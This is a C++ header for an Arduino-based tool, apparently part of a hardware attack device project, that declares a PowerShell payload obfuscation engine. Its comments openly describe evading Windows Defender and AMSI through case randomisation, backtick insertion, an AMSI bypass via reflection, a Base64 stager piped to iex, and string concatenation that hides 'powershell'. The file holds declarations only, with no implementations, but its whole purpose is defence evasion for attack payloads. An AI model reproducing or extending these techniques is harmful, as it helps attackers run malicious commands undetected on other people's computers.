/**
 * @file payload_obfuscator.h
 * @brief PowerShell Payload Obfuscation Engine
 * 
 * Provides modern obfuscation techniques for evading Windows Defender,
 * AMSI, and signature-based detection. Techniques include:
 * 
 * - **Case Randomization**: Randomly flips character case (URL-aware)
 * - **Backtick Insertion**: Breaks keyword signatures with escape chars
 * - **AMSI Bypass**: Patches amsiInitFailed via reflection
 * - **Base64 Encoding**: Wraps payload in decoder for signature evasion
 * - **Env Var Method**: Hides 'powershell' using string concatenation
 * 
 * Inspired by DSViper and 2024 FUD research.
 * 
 * @see https://github.com/dagowda/DSViper
 * @author Monster S3 Team
 * @date 2025
 * @version 2.0
 */

#pragma once

#include <Arduino.h>

/**
 * @class PayloadObfuscator
 * @brief Static utility class for PowerShell payload obfuscation
 * 
 * All methods are static. Combine techniques for layered evasion:
 * @code
 * String safe = PayloadObfuscator::wrapWithAMSIBypass(
 *     PayloadObfuscator::obfuscatePS1(raw, true, true)
 * );
 * @endcode
 */
class PayloadObfuscator {
public:
    /**
     * @brief Primary obfuscation function
     * 
     * Applies case randomization and backtick insertion to break
     * static signatures while maintaining valid PowerShell syntax.
     * 
     * @param input The raw PowerShell command string
     * @param useCase Enable random case flipping (30% of chars)
     * @param useBackticks Enable backtick insertion in keywords
     * @return Obfuscated string (still valid PowerShell)
     */
    static String obfuscatePS1(String input, bool useCase = true, bool useBackticks = true);
    
    /**
     * @brief Prepend AMSI bypass to payload
     * 
     * Patches `amsiInitFailed` via reflection using string concatenation
     * to avoid static detection of the bypass itself.
     * 
     * @warning May be signatured - use with Base64 wrapper for safety
     * @param payload The payload to protect
     * @return Payload with AMSI bypass prepended
     */
    static String wrapWithAMSIBypass(String payload);
    
    /**
     * @brief Encode payload as Base64 and wrap in decoder
     * 
     * Completely hides payload content. Decoder uses:
     * `[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('...'))|iex`
     * 
     * @param payload The raw PowerShell command
     * @return Base64-encoded stager
     */
    static String wrapWithBase64(String payload);
    
    /**
     * @brief Environment variable concatenation method
     * 
     * Replaces 'powershell' with `&('Powe'+'rShe'+'ll')` and wraps
     * in cmd.exe for additional obfuscation layer.
     * 
     * @param payload The raw PowerShell command  
     * @return Obfuscated payload using string concatenation
     */
    static String wrapWithEnvVar(String payload);
    
private:
    /**
     * @brief Randomize character case (URL-aware)
     * @param input Raw string
     * @return String with ~30% of chars case-flipped (preserves URLs)
     */
    static String _randomizeCase(String input);
    
    /**
     * @brief Insert backticks into PowerShell keywords
     * @param input Raw string
     * @return String with keywords like 'iex' -> 'i`ex'
     */
    static String _insertBackticks(String input);
    
    /**
     * @brief Base64 encode using mbedtls
     * @param input Raw string
     * @return Base64-encoded string
     */
    static String _base64Encode(String input);
};
